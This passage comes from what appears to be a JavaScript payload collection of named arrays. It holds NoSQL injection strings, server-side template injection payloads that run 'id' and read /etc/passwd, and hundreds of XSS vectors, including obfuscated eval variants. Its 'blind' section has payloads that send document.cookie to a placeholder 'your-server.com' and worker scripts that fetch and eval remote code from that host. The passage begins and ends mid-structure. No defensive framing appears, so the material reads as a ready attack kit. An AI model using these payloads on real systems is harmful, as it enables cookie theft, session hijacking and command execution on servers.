            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}',
            '{"username": {"$regex": ".*"}}',
            '{"password": {"$exists": true}}',
            '{"$where": "this.password.length > 0"}',
            '{"$where": "function() { return true; }"}',
            '{"$where": "sleep(5000)"}'
        ],
        
        ssti: [
            '{{7*7}}',
            '${7*7}',
            '${{7*7}}',
            '#{7*7}',
            '<%= 7*7 %>',
            '${{7*7}}',
            '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
            '{{request.application.__globals__.__builtins__.__import__("os").system("cat /etc/passwd")}}',
            '${T(java.lang.Runtime).getRuntime().exec("id")}',
            '${T(java.lang.System).getProperty("user.name")}',
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            '<@java.lang.Runtime.getRuntime().exec("id")/>',
            '{{request["env"]["PATH"]}}',
            '{{config.items()[0][1].__class__.__mro__[1].__subclasses__()[40]("/etc/passwd").read()}}',
            '{{"".__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen("id").read()}}'
        ],
        
        polyglot_advanced: [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//',
            '\'"--><script>alert("XSS")</script>',
            '\'"--><img src=x onerror=alert("XSS")>',
            'javascript://\'"/title></style></textarea></script><img src=x onerror=alert("XSS")>',
            '\'</style></script><script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '\'><script>alert("XSS")</script>',
            'javascript:alert("XSS")//',
            '"><img src=x onerror=alert("XSS")>',
            '\'><img src=x onerror=alert("XSS")>',
            'javascript://\'"/title></style></textarea></script><svg onload=alert("XSS")>',
            '"><svg onload=alert("XSS")>',
            '\'><svg onload=alert("XSS")>',
            'javascript://\'"/title></style></textarea></script><iframe src="javascript:alert(\'XSS\')">',
            '"><iframe src="javascript:alert(\'XSS\')">',
            '\'><iframe src="javascript:alert(\'XSS\')">',
            'javascript://\'"/title></style></textarea></script><embed src="javascript:alert(\'XSS\')">',
            '"><embed src="javascript:alert(\'XSS\')">',
            '\'><embed src="javascript:alert(\'XSS\')">',
            'javascript://\'"/title></style></textarea></script><object data="javascript:alert(\'XSS\')">',
            '"><object data="javascript:alert(\'XSS\')">',
            '\'><object data="javascript:alert(\'XSS\')">'
        ],
        
        javascript_obfuscation: [
            'javascript:eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))',
            'javascript:eval(atob("YWxlcnQoIlhTUyIp"))',
            'javascript:eval(unescape("alert%28%22XSS%22%29"))',
            'javascript:Function(atob("YWxlcnQoIlhTUyIp"))()',
            'javascript:setTimeout(atob("YWxlcnQoIlhTUyIp"), 0)',
            'javascript:setInterval(atob("YWxlcnQoIlhTUyIp"), 1000)',
            'javascript:window["al"+"ert"](atob("WFNT"))',
            'javascript:window[String.fromCharCode(97,108,101,114,116)](String.fromCharCode(88,83,83))',
            'javascript:top[String.fromCharCode(97,108,101,114,116)](String.fromCharCode(88,83,83))',
            'javascript:parent[String.fromCharCode(97,108,101,114,116)](String.fromCharCode(88,83,83))',
            'javascript:self[String.fromCharCode(97,108,101,114,116)](String.fromCharCode(88,83,83))',
            'javascript:frames[0][String.fromCharCode(97,108,101,114,116)](String.fromCharCode(88,83,83))',
            'javascript:eval(location.hash.slice(1))',
            'javascript:eval(location.search.slice(1))',
            'javascript:eval(location.href.slice(location.href.indexOf("#")+1))',
            'javascript:eval(name)',
            'javascript:eval(document.cookie)',
            'javascript:eval(document.referrer)'
        ],
        
        css_expression: [
            '<div style="xss:expression(alert(\'XSS\'))">',
            '<div style="background:expression(alert(\'XSS\'))">',
            '<div style="width:expression(alert(\'XSS\'))">',
            '<div style="height:expression(alert(\'XSS\'))">',
            '<div style="color:expression(alert(\'XSS\'))">',
            '<div style="font-size:expression(alert(\'XSS\'))">',
            '<div style="border:expression(alert(\'XSS\'))">',
            '<div style="margin:expression(alert(\'XSS\'))">',
            '<div style="padding:expression(alert(\'XSS\'))">',
            '<div style="list-style:expression(alert(\'XSS\'))">',
            '<div style="cursor:expression(alert(\'XSS\'))">',
            '<div style="filter:expression(alert(\'XSS\'))">',
            '<div style="behavior:url(xss.htc)">',
            '<div style="binding:url(xss.xml#xss)">',
            '<div style="-ms-filter:\'progid:DXImageTransform.Microsoft.AlphaImageLoader(src=javascript:alert("XSS"))\'">',
            '<div style="background-image:expression(alert(\'XSS\'))">',
            '<div style="border-image:expression(alert(\'XSS\'))">',
            '<div style="mask:expression(alert(\'XSS\'))">',
            '<div style="content:expression(alert(\'XSS\'))">'
        ],
        
        behavior: [
            '<div style="behavior:url(#default#clientCaps)" onreadystatechange="alert(\'XSS\')"></div>',
            '<div style="behavior:url(#default#download)" onreadystatechange="alert(\'XSS\')"></div>',
            '<div style="behavior:url(#default#homePage)" onreadystatechange="alert(\'XSS\')"></div>',
            '<div style="behavior:url(#default#httpFolder)" onreadystatechange="alert(\'XSS\')"></div>',
            '<div style="behavior:url(#default#siteData)" onreadystatechange="alert(\'XSS\')"></div>',
            '<div style="behavior:url(#default#userData)" onreadystatechange="alert(\'XSS\')"></div>',
            '<div style="behavior:url(#default#folder)" onreadystatechange="alert(\'XSS\')"></div>',
            '<div style="behavior:url(#default#anchorClick)" onreadystatechange="alert(\'XSS\')"></div>',
            '<div style="behavior:url(#default#saveSnapshot)" onreadystatechange="alert(\'XSS\')"></div>',
            '<div style="behavior:url(#default#saveHistory)" onreadystatechange="alert(\'XSS\')"></div>'
        ],
        
        drag_drop: [
            '<div draggable="true" ondragstart="alert(\'XSS\')">Drag me</div>',
            '<div ondragenter="alert(\'XSS\')">Drop here</div>',
            '<div ondragover="alert(\'XSS\')">Drop here</div>',
            '<div ondrop="alert(\'XSS\')">Drop here</div>',
            '<div ondragend="alert(\'XSS\')">Drag me</div>',
            '<div ondragexit="alert(\'XSS\')">Drop here</div>',
            '<div ondragleave="alert(\'XSS\')">Drop here</div>',
            '<input type="file" onchange="alert(\'XSS\')">',
            '<input type="file" onfocus="alert(\'XSS\')" autofocus>',
            '<input type="file" onblur="alert(\'XSS\')">',
            '<div ondragover="return false" ondrop="alert(\'XSS\')">Drop here</div>',
            '<div draggable="true" ondragstart="eval(\'alert(\\\\\'XSS\\\\\')\')">Drag me</div>'
        ],
        
        clipboard: [
            '<div oncopy="alert(\'XSS\')">Copy me</div>',
            '<div oncut="alert(\'XSS\')">Cut me</div>',
            '<div onpaste="alert(\'XSS\')">Paste here</div>',
            '<input oncopy="alert(\'XSS\')" value="Copy me">',
            '<input oncut="alert(\'XSS\')" value="Cut me">',
            '<input onpaste="alert(\'XSS\')">',
            '<textarea oncopy="alert(\'XSS\')">Copy me</textarea>',
            '<textarea oncut="alert(\'XSS\')">Cut me</textarea>',
            '<textarea onpaste="alert(\'XSS\')">Paste here</textarea>',
            '<div contenteditable="true" oncopy="alert(\'XSS\')">Copy me</div>',
            '<div contenteditable="true" oncut="alert(\'XSS\')">Cut me</div>',
            '<div contenteditable="true" onpaste="alert(\'XSS\')">Paste here</div>',
            '<div oncopy="eval(\'alert(\\\\\'XSS\\\\\')\')">Copy me</div>',
            '<div oncut="eval(\'alert(\\\\\'XSS\\\\\')\')">Cut me</div>',
            '<div onpaste="eval(\'alert(\\\\\'XSS\\\\\')\')">Paste here</div>'
        ],
        
        pointer_events: [
            '<div onpointerdown="alert(\'XSS\')">Click me</div>',
            '<div onpointerup="alert(\'XSS\')">Click me</div>',
            '<div onpointermove="alert(\'XSS\')">Move here</div>',
            '<div onpointerover="alert(\'XSS\')">Hover me</div>',
            '<div onpointerout="alert(\'XSS\')">Leave me</div>',
            '<div onpointerenter="alert(\'XSS\')">Enter me</div>',
            '<div onpointerleave="alert(\'XSS\')">Leave me</div>',
            '<div onpointercancel="alert(\'XSS\')">Cancel me</div>',
            '<div ongotpointercapture="alert(\'XSS\')">Capture me</div>',
            '<div onlostpointercapture="alert(\'XSS\')">Lose me</div>',
            '<div onpointerrawupdate="alert(\'XSS\')">Raw me</div>'
        ],
        
        touch_events: [
            '<div ontouchstart="alert(\'XSS\')">Touch me</div>',
            '<div ontouchend="alert(\'XSS\')">Touch me</div>',
            '<div ontouchmove="alert(\'XSS\')">Touch me</div>',
            '<div ontouchcancel="alert(\'XSS\')">Touch me</div>',
            '<div ontouchforcechange="alert(\'XSS\')">Force touch me</div>',
            '<canvas ontouchstart="alert(\'XSS\')" width="100" height="100"></canvas>',
            '<canvas ontouchend="alert(\'XSS\')" width="100" height="100"></canvas>',
            '<canvas ontouchmove="alert(\'XSS\')" width="100" height="100"></canvas>',
            '<canvas ontouchcancel="alert(\'XSS\')" width="100" height="100"></canvas>',
            '<img src=x ontouchstart=alert("XSS")>',
            '<img src=x ontouchend=alert("XSS")>',
            '<img src=x ontouchmove=alert("XSS")>',
            '<img src=x ontouchcancel=alert("XSS")>'
        ],
        
        network_events: [
            '<body ononline="alert(\'XSS\')">',
            '<body onoffline="alert(\'XSS\')">',
            '<window ononline="alert(\'XSS\')">',
            '<window onoffline="alert(\'XSS\')">',
            '<div onloadstart="alert(\'XSS\')">Load me</div>',
            '<div onloadend="alert(\'XSS\')">Load me</div>',
            '<div onprogress="alert(\'XSS\')">Progress me</div>',
            '<body ononline="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<body onoffline="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<window ononline="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<window onoffline="eval(\'alert(\\\\\'XSS\\\\\')\')">'
        ],
        
        print_events: [
            '<body onbeforeprint="alert(\'XSS\')">',
            '<body onafterprint="alert(\'XSS\')">',
            '<window onbeforeprint="alert(\'XSS\')">',
            '<window onafterprint="alert(\'XSS\')">',
            '<div onbeforeprint="alert(\'XSS\')">Print me</div>',
            '<div onafterprint="alert(\'XSS\')">Print me</div>',
            '<body onbeforeprint="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<body onafterprint="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<window onbeforeprint="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<window onafterprint="eval(\'alert(\\\\\'XSS\\\\\')\')">'
        ],
        
        hash_change: [
            '<window onhashchange="alert(\'XSS\')">',
            '<body onhashchange="alert(\'XSS\')">',
            '<div onhashchange="alert(\'XSS\')">Hash me</div>',
            '<iframe onhashchange="alert(\'XSS\')">',
            '<frame onhashchange="alert(\'XSS\')">',
            '<window onhashchange="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<body onhashchange="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<div onhashchange="eval(\'alert(\\\\\'XSS\\\\\')\')">Hash me</div>',
            '<iframe onhashchange="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<frame onhashchange="eval(\'alert(\\\\\'XSS\\\\\')\')">'
        ],
        
        page_visibility: [
            '<document onvisibilitychange="alert(\'XSS\')">',
            '<body onvisibilitychange="alert(\'XSS\')">',
            '<div onvisibilitychange="alert(\'XSS\')">Visible me</div>',
            '<window onvisibilitychange="alert(\'XSS\')">',
            '<document onpageshow="alert(\'XSS\')">',
            '<document onpagehide="alert(\'XSS\')">',
            '<window onpageshow="alert(\'XSS\')">',
            '<window onpagehide="alert(\'XSS\')">',
            '<document onvisibilitychange="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<body onvisibilitychange="eval(\'alert(\\\\\'XSS\\\\\')\')">'
        ],
        
        storage_events: [
            '<window onstorage="alert(\'XSS\')">',
            '<body onstorage="alert(\'XSS\')">',
            '<div onstorage="alert(\'XSS\')">Store me</div>',
            '<window onpopstate="alert(\'XSS\')">',
            '<body onpopstate="alert(\'XSS\')">',
            '<div onpopstate="alert(\'XSS\')">Pop me</div>',
            '<window onstorage="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<body onstorage="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<window onpopstate="eval(\'alert(\\\\\'XSS\\\\\')\')">',
            '<body onpopstate="eval(\'alert(\\\\\'XSS\\\\\')\')">'
        ],
        
        animation_events: [
            '<div onanimationstart="alert(\'XSS\')">Animate me</div>',
            '<div onanimationend="alert(\'XSS\')">Animate me</div>',
            '<div onanimationiteration="alert(\'XSS\')">Animate me</div>',
            '<div ontransitionstart="alert(\'XSS\')">Transit me</div>',
            '<div ontransitionend="alert(\'XSS\')">Transit me</div>',
            '<div ontransitionrun="alert(\'XSS\')">Transit me</div>',
            '<div ontransitioncancel="alert(\'XSS\')">Transit me</div>',
            '<div onanimationstart="eval(\'alert(\\\\\'XSS\\\\\')\')">Animate me</div>',
            '<div onanimationend="eval(\'alert(\\\\\'XSS\\\\\')\')">Animate me</div>',
            '<div ontransitionstart="eval(\'alert(\\\\\'XSS\\\\\')\')">Transit me</div>',
            '<div ontransitionend="eval(\'alert(\\\\\'XSS\\\\\')\')">Transit me</div>'
        ],
        
        form_events: [
            '<form onsubmit="alert(\'XSS\')"><input type="submit"></form>',
            '<form onreset="alert(\'XSS\')"><input type="reset"></form>',
            '<form oninput="alert(\'XSS\')"><input></form>',
            '<form onformdata="alert(\'XSS\')"><input name="x" value="x"></form>',
            '<form onchange="alert(\'XSS\')"><input></form>',
            '<input form="xss" onformdata="alert(\'XSS\')">',
            '<input form="xss" onchange="alert(\'XSS\')">',
            '<input form="xss" oninput="alert(\'XSS\')">',
            '<form onsubmit="eval(\'alert(\\\\\'XSS\\\\\')\')"><input type="submit"></form>',
            '<form oninput="eval(\'alert(\\\\\'XSS\\\\\')\')"><input></form>'
        ],
        
        device_events: [
            '<div ondevicelight="alert(\'XSS\')">Light me</div>',
            '<div ondeviceproximity="alert(\'XSS\')">Proximity me</div>',
            '<div ondeviceorientation="alert(\'XSS\')">Orient me</div>',
            '<div ondevicemotion="alert(\'XSS\')">Motion me</div>',
            '<window ondevicelight="alert(\'XSS\')">',
            '<window ondeviceproximity="alert(\'XSS\')">',
            '<window ondeviceorientation="alert(\'XSS\')">',
            '<window ondevicemotion="alert(\'XSS\')">',
            '<div ondevicelight="eval(\'alert(\\\\\'XSS\\\\\')\')">Light me</div>',
            '<div ondeviceorientation="eval(\'alert(\\\\\'XSS\\\\\')\')">Orient me</div>'
        ],
        
        webgl: [
            '<canvas id="xss" width="100" height="100"></canvas><script>var gl=document.getElementById("xss").getContext("webgl");alert("XSS")</script>',
            '<canvas id="xss" width="100" height="100"></canvas><script>var gl=document.getElementById("xss").getContext("experimental-webgl");alert("XSS")</script>',
            '<canvas id="xss" width="100" height="100"></canvas><script>var gl=document.getElementById("xss").getContext("webgl2");alert("XSS")</script>',
            '<canvas id="xss" width="100" height="100"></canvas><script>document.getElementById("xss").addEventListener("webglcontextcreationerror",function(){alert("XSS")})</script>',
            '<canvas id="xss" width="100" height="100"></canvas><script>document.getElementById("xss").addEventListener("webglcontextlost",function(){alert("XSS")})</script>',
            '<canvas id="xss" width="100" height="100"></canvas><script>document.getElementById("xss").addEventListener("webglcontextrestored",function(){alert("XSS")})</script>',
            '<canvas id="xss" width="100" height="100"></canvas><script>var gl=document.getElementById("xss").getContext("webgl");gl.getExtension("WEBGL_debug_renderer_info");alert("XSS")</script>',
            '<canvas id="xss" width="100" height="100"></canvas><script>var gl=document.getElementById("xss").getContext("webgl");gl.getParameter(gl.VENDOR);alert("XSS")</script>'
        ],
        
        workers: [
            '<script>new Worker("data:text/javascript,alert(\'XSS\')")</script>',
            '<script>new SharedWorker("data:text/javascript,alert(\'XSS\')")</script>',
            '<script>new Worker(URL.createObjectURL(new Blob([\'alert("XSS")\'])))</script>',
            '<script>new SharedWorker(URL.createObjectURL(new Blob([\'alert("XSS")\'])))</script>',
            '<script>navigator.serviceWorker.register("data:text/javascript,alert(\'XSS\')")</script>',
            '<script>navigator.serviceWorker.register(URL.createObjectURL(new Blob([\'alert("XSS")\'])))</script>'
        ],
        
        crypto_api: [
            '<script>crypto.subtle.digest("SHA-256", new TextEncoder().encode("XSS")).then(()=>alert("XSS"))</script>',
            '<script>crypto.getRandomValues(new Uint8Array(1));alert("XSS")</script>',
            '<script>crypto.subtle.generateKey({name:"AES-GCM",length:256},true,["encrypt","decrypt"]).then(()=>alert("XSS"))</script>',
            '<script>crypto.subtle.importKey("raw",new TextEncoder().encode("XSS"),{name:"AES-GCM"},false,["encrypt","decrypt"]).then(()=>alert("XSS"))</script>',
            '<script>window.crypto.subtle.digest("SHA-256", new TextEncoder().encode("XSS")).then(()=>alert("XSS"))</script>'
        ],
        
        notification_api: [
            '<script>Notification.requestPermission().then(()=>new Notification("XSS"))</script>',
            '<script>Notification.requestPermission().then(()=>new Notification("XSS",{body:"You are hacked!"}))</script>',
            '<script>Notification.requestPermission().then(()=>new Notification("XSS",{icon:"http://evil.com/icon.png"}))</script>',
            '<script>Notification.requestPermission().then(()=>new Notification("XSS",{image:"http://evil.com/image.png"}))</script>',
            '<script>Notification.requestPermission().then(()=>new Notification("XSS",{badge:"http://evil.com/badge.png"}))</script>',
            '<script>Notification.requestPermission().then(()=>new Notification("XSS",{tag:"xss"}))</script>',
            '<script>Notification.requestPermission().then(()=>new Notification("XSS",{requireInteraction:true}))</script>',
            '<script>Notification.requestPermission().then(()=>new Notification("XSS",{silent:true}))</script>'
        ],
        
        geolocation_api: [
            '<script>navigator.geolocation.getCurrentPosition(()=>alert("XSS"))</script>',
            '<script>navigator.geolocation.getCurrentPosition((pos)=>alert("XSS:"+pos.coords.latitude))</script>',
            '<script>navigator.geolocation.watchPosition(()=>alert("XSS"))</script>',
            '<script>navigator.geolocation.watchPosition((pos)=>alert("XSS:"+pos.coords.latitude+","+pos.coords.longitude))</script>',
            '<script>navigator.geolocation.getCurrentPosition(()=>{},()=>{},{});alert("XSS")</script>'
        ],
        
        media_api: [
            '<script>navigator.mediaDevices.getUserMedia({video:true}).then(()=>alert("XSS"))</script>',
            '<script>navigator.mediaDevices.getUserMedia({audio:true}).then(()=>alert("XSS"))</script>',
            '<script>navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(()=>alert("XSS"))</script>',
            '<script>navigator.mediaDevices.enumerateDevices().then(()=>alert("XSS"))</script>',
            '<script>navigator.mediaDevices.getSupportedConstraints();alert("XSS")</script>'
        ],
        
        battery_api: [
            '<script>navigator.getBattery().then(()=>alert("XSS"))</script>',
            '<script>navigator.getBattery().then((battery)=>alert("XSS:"+battery.level))</script>',
            '<script>navigator.getBattery().then((battery)=>battery.addEventListener("levelchange",()=>alert("XSS")))</script>',
            '<script>navigator.getBattery().then((battery)=>battery.addEventListener("chargingchange",()=>alert("XSS")))</script>',
            '<script>navigator.getBattery().then((battery)=>battery.addEventListener("dischargingtimechange",()=>alert("XSS")))</script>'
        ],
        
        vibration_api: [
            '<script>navigator.vibrate(100);alert("XSS")</script>',
            '<script>navigator.vibrate([100,50,100]);alert("XSS")</script>',
            '<script>navigator.vibrate(0);alert("XSS")</script>',
            '<script>if(navigator.vibrate)alert("XSS")</script>',
            '<script>navigator.vibrate&&alert("XSS")</script>'
        ],
        
        device_memory: [
            '<script>alert(navigator.deviceMemory)</script>',
            '<script>navigator.deviceMemory&&alert("XSS")</script>',
            '<script>if(navigator.deviceMemory)alert("XSS")</script>',
            '<script>navigator.deviceMemory>0&&alert("XSS")</script>',
            '<script>navigator.deviceMemory<100&&alert("XSS")</script>'
        ],
        
        connection_api: [
            '<script>alert(navigator.connection.effectiveType)</script>',
            '<script>navigator.connection.addEventListener("change",()=>alert("XSS"))</script>',
            '<script>navigator.onLine&&alert("XSS")</script>',
            '<script>if(navigator.onLine)alert("XSS")</script>',
            '<script>navigator.connection.downlink>0&&alert("XSS")</script>',
            '<script>navigator.connection.rtt>0&&alert("XSS")</script>'
        ],
        
        permissions_api: [
            '<script>navigator.permissions.query({name:"geolocation"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.permissions.query({name:"notifications"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.permissions.query({name:"camera"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.permissions.query({name:"microphone"}).then(()=>alert("XSS"))</script>',
            '<script>navigator.permissions.query({name:"clipboard-read"}).then(()=>alert("XSS"))</script>'
        ],
        
        fullscreen_api: [
            '<script>document.documentElement.requestFullscreen().then(()=>alert("XSS"))</script>',
            '<script>document.body.requestFullscreen().then(()=>alert("XSS"))</script>',
            '<script>document.querySelector("div").requestFullscreen().then(()=>alert("XSS"))</script>',
            '<script>document.addEventListener("fullscreenchange",()=>alert("XSS"))</script>',
            '<script>document.addEventListener("fullscreenerror",()=>alert("XSS"))</script>'
        ],
        
        intersection_observer: [
            '<script>new IntersectionObserver(()=>alert("XSS")).observe(document.body)</script>',
            '<script>new IntersectionObserver((entries)=>entries.forEach(()=>alert("XSS"))).observe(document.body)</script>',
            '<script>new IntersectionObserver(()=>{},{}).observe(document.body);alert("XSS")</script>',
            '<script>var observer=new IntersectionObserver(()=>alert("XSS"));observer.observe(document.querySelector("div"))</script>',
            '<script>document.querySelector("div").addEventListener("visibilitychange",()=>alert("XSS"))</script>'
        ],
        
        resize_observer: [
            '<script>new ResizeObserver(()=>alert("XSS")).observe(document.body)</script>',
            '<script>new ResizeObserver((entries)=>entries.forEach(()=>alert("XSS"))).observe(document.body)</script>',
            '<script>new ResizeObserver(()=>{},{}).observe(document.body);alert("XSS")</script>',
            '<script>var observer=new ResizeObserver(()=>alert("XSS"));observer.observe(document.querySelector("div"))</script>'
        ],
        
        mutation_observer: [
            '<script>new MutationObserver(()=>alert("XSS")).observe(document.body,{childList:true})</script>',
            '<script>new MutationObserver((mutations)=>mutations.forEach(()=>alert("XSS"))).observe(document.body,{childList:true})</script>',
            '<script>new MutationObserver(()=>{},{}).observe(document.body,{childList:true});alert("XSS")</script>',
            '<script>var observer=new MutationObserver(()=>alert("XSS"));observer.observe(document.querySelector("div"),{childList:true})</script>',
            '<script>new MutationObserver(()=>alert("XSS")).observe(document.body,{attributes:true})</script>'
        ],
        
        performance_api: [
            '<script>performance.mark("xss");alert("XSS")</script>',
            '<script>performance.measure("xss","xss");alert("XSS")</script>',
            '<script>performance.getEntriesByType("mark");alert("XSS")</script>',
            '<script>performance.getEntriesByName("xss");alert("XSS")</script>',
            '<script>performance.now();alert("XSS")</script>',
            '<script>performance.timing;alert("XSS")</script>',
            '<script>performance.navigation;alert("XSS")</script>'
        ],
        
        audio_context: [
            '<script>var audioCtx=new(window.AudioContext||window.webkitAudioContext)();alert("XSS")</script>',
            '<script>var audioCtx=new(window.AudioContext||window.webkitAudioContext)();audioCtx.createOscillator();alert("XSS")</script>',
            '<script>var audioCtx=new(window.AudioContext||window.webkitAudioContext)();audioCtx.createGain();alert("XSS")</script>',
            '<script>var audioCtx=new(window.AudioContext||window.webkitAudioContext)();audioCtx.destination;alert("XSS")</script>',
            '<script>var audioCtx=new(window.AudioContext||window.webkitAudioContext)();audioCtx.currentTime;alert("XSS")</script>'
        ],
        
        speech_api: [
            '<script>var utterance=new SpeechSynthesisUtterance("XSS");speechSynthesis.speak(utterance);alert("XSS")</script>',
            '<script>var utterance=new SpeechSynthesisUtterance("You are hacked by XSS");speechSynthesis.speak(utterance);alert("XSS")</script>',
            '<script>speechSynthesis.getVoices();alert("XSS")</script>',
            '<script>var utterance=new SpeechSynthesisUtterance("XSS");utterance.onstart=function(){alert("XSS")};speechSynthesis.speak(utterance)</script>',
            '<script>var recognition=new webkitSpeechRecognition();recognition.onresult=function(){alert("XSS")};recognition.start()</script>'
        ],
        
        webrtc: [
            '<script>var pc=new RTCPeerConnection();pc.createOffer().then(()=>alert("XSS"))</script>',
            '<script>var pc=new RTCPeerConnection();pc.createDataChannel("xss");alert("XSS")</script>',
            '<script>var pc=new RTCPeerConnection();pc.onicecandidate=function(){alert("XSS")};pc.createOffer()</script>',
            '<script>var pc=new RTCPeerConnection();pc.onconnectionstatechange=function(){alert("XSS")};pc.createOffer()</script>',
            '<script>var pc=new RTCPeerConnection();pc.onsignalingstatechange=function(){alert("XSS")};pc.createOffer()</script>'
        ],
        
        gamepad_api: [
            '<script>window.addEventListener("gamepadconnected",()=>alert("XSS"))</script>',
            '<script>window.addEventListener("gamepaddisconnected",()=>alert("XSS"))</script>',
            '<script>navigator.getGamepads();alert("XSS")</script>',
            '<script>setInterval(()=>{if(navigator.getGamepads().length>0)alert("XSS")},1000)</script>',
            '<script>window.addEventListener("gamepadconnected",function(){alert("XSS")})</script>'
        ]
    },
    
    blind: {
        callback: [
            '<script src="http://your-server.com/xss.js?c='+document.cookie+'"></script>',
            '<img src="http://your-server.com/xss.gif?c='+document.cookie+'">',
            '<script>new Image().src="http://your-server.com/xss.gif?c="+document.cookie</script>',
            '<script>fetch("http://your-server.com/xss?c="+document.cookie)</script>',
            '<script>navigator.sendBeacon("http://your-server.com/xss", document.cookie)</script>',
            '<svg onload="fetch(\'http://your-server.com/xss?c=\'+document.cookie)">',
            '<input onfocus="fetch(\'http://your-server.com/xss?c=\'+document.cookie)" autofocus>',
            '<iframe src="javascript:fetch(\'http://your-server.com/xss?c=\'+document.cookie)">',
            '<object data="javascript:fetch(\'http://your-server.com/xss?c=\'+document.cookie)">',
            '<embed src="javascript:fetch(\'http://your-server.com/xss?c=\'+document.cookie)">'
        ],
        
        delayed: [
            '<script>setTimeout(function(){alert("XSS")}, 5000)</script>',
            '<script>setInterval(function(){alert("XSS")}, 10000)</script>',
            '<script>setTimeout(function(){fetch("http://your-server.com/xss?c="+document.cookie)}, 5000)</script>',
            '<script>setInterval(function(){fetch("http://your-server.com/xss?c="+document.cookie)}, 10000)</script>',
            '<script>document.addEventListener("DOMContentLoaded", function(){alert("XSS")})</script>',
            '<script>window.addEventListener("load", function(){alert("XSS")})</script>',
            '<script>document.addEventListener("mousemove", function(){alert("XSS")}, {once: true})</script>',
            '<script>document.addEventListener("click", function(){alert("XSS")}, {once: true})</script>',
            '<script>setTimeout(function(){eval("alert(\'XSS\')")}, 3000)</script>',
            '<script>setTimeout(function(){document.write("<img src=x onerror=alert(\'XSS\')>")}, 5000)</script>'
        ],
        
        persistent: [
            '<script>localStorage.setItem("xss", "true"); setInterval(function(){if(localStorage.getItem("xss")) alert("XSS")}, 5000)</script>',
            '<script>sessionStorage.setItem("xss", "true"); setInterval(function(){if(sessionStorage.getItem("xss")) alert("XSS")}, 5000)</script>',
            '<script>document.cookie="xss=true"; setInterval(function(){if(document.cookie.includes("xss")) alert("XSS")}, 5000)</script>',
            '<script>var xss=true; setInterval(function(){if(xss) alert("XSS")}, 5000)</script>',
            '<script>window.name="xss"; setInterval(function(){if(window.name==="xss") alert("XSS")}, 5000)</script>',
            '<script>history.pushState({xss:true}, "xss"); setInterval(function(){if(history.state&&history.state.xss) alert("XSS")}, 5000)</script>',
            '<script>window.xss=true; setInterval(function(){if(window.xss) alert("XSS")}, 5000)</script>',
            '<script>document.documentElement.setAttribute("data-xss", "true"); setInterval(function(){if(document.documentElement.getAttribute("data-xss")==="true") alert("XSS")}, 5000)</script>',
            '<script>window.addEventListener("storage", function(){if(localStorage.getItem("trigger")==="xss") alert("XSS")}); localStorage.setItem("trigger", "xss")</script>',
            '<script>window.addEventListener("message", function(e){if(e.data==="xss") alert("XSS")}); window.postMessage("xss", "*")</script>'
        ],
        
        service_worker: [
            '<script>navigator.serviceWorker.register("data:text/javascript,alert(\'XSS\')")</script>',
            '<script>navigator.serviceWorker.register("data:text/javascript,setInterval(function(){alert(\'XSS\')}, 5000)")</script>',
            '<script>navigator.serviceWorker.register("data:text/javascript,self.addEventListener(\'message\', function(){alert(\'XSS\')})")</script>',
            '<script>navigator.serviceWorker.register("data:text/javascript,self.addEventListener(\'fetch\', function(){alert(\'XSS\')})")</script>',
            '<script>navigator.serviceWorker.register("data:text/javascript,self.addEventListener(\'install\', function(){alert(\'XSS\')})")</script>',
            '<script>navigator.serviceWorker.register("data:text/javascript,self.addEventListener(\'activate\', function(){alert(\'XSS\')})")</script>',
            '<script>navigator.serviceWorker.register("data:text/javascript,self.addEventListener(\'push\', function(){alert(\'XSS\')})")</script>',
            '<script>navigator.serviceWorker.register("data:text/javascript,self.addEventListener(\'notificationclick\', function(){alert(\'XSS\')})")</script>',
            '<script>navigator.serviceWorker.register("data:text/javascript,importScripts(\'http://your-server.com/xss.js\')")</script>',
            '<script>navigator.serviceWorker.register("data:text/javascript,fetch(\'http://your-server.com/xss.js\').then(r=>r.text()).then(eval)")</script>'
        ],
        
        web_worker: [
            '<script>new Worker("data:text/javascript,alert(\'XSS\')")</script>',
            '<script>new Worker("data:text/javascript,setInterval(function(){alert(\'XSS\')}, 5000)")</script>',
            '<script>new Worker("data:text/javascript,postMessage(\'XSS\');self.addEventListener(\'message\', function(){alert(\'XSS\')})")</script>',
            '<script>new Worker("data:text/javascript,importScripts(\'http://your-server.com/xss.js\')")</script>',
            '<script>new Worker("data:text/javascript,fetch(\'http://your-server.com/xss.js\').then(r=>r.text()).then(eval)")</script>',
            '<script>new Worker("data:text/javascript,self.addEventListener(\'error\', function(){alert(\'XSS\')})")</script>',
            '<script>new Worker("data:text/javascript,self.addEventListener(\'messageerror\', function(){alert(\'XSS\')})")</script>',
            '<script>new Worker(URL.createObjectURL(new Blob([\'alert("XSS")\'])))</script>',
            '<script>new Worker(URL.createObjectURL(new Blob([\'setInterval(function(){alert("XSS")}, 5000)\'])))</script>',
            '<script>var worker=new Worker("data:text/javascript,alert(\'XSS\')");worker.postMessage("trigger")</script>'
        ],
        
        shared_worker: [
            '<script>new SharedWorker("data:text/javascript,alert(\'XSS\')")</script>',
            '<script>new SharedWorker("data:text/javascript,setInterval(function(){alert(\'XSS\')}, 5000)")</script>',
